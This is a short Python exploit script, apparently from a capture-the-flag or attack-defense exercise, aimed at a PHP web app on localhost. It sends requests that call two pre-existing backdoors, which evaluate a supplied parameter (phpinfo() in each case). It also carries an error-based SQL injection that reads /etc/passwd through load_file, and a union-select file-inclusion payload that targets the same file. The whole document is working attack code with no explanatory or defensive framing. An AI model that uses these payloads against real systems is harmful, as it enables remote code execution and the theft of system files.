import requests

def zi_dai_hou_men_1():
	url = 'http://127.0.0.1:8080/admin/js/big.js.php?a=phpinfo();'
	print(requests.get(url).text)
def zi_dai_hou_men_2():
	url = "http://127.0.0.1:8080/"
	data = {'a':'phpinfo();'}
	print(requests.post(url,data).text)
def sql_1():
	url = "http://127.0.0.1:8080/search.php?keyword=1%27%20||%20extractvalue(1,concat(0x7e,(load_file(%27/etc/passwd%27))))%23&search=%E6%90%9C%E7%B4%A2"
	print(requests.get(url).text)
def include_file():
	url = "http://127.0.0.1:8080/graph.php?id=-1%27%20union%20select%20%22/etc/passwd%22,2,3%23"
	print(requests.get(url).text)
#zi_dai_hou_men_1()
#zi_dai_hou_men_2()
#sql_1()
#include_file()
